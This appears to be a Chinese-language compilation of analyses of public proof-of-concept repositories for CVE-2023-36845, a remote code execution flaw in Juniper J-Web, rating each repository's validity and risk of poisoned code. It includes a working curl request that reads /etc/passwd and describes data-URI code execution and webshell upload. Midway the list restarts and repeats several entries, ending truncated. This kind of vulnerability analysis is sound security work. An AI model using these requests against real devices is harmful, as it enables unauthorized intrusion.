**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

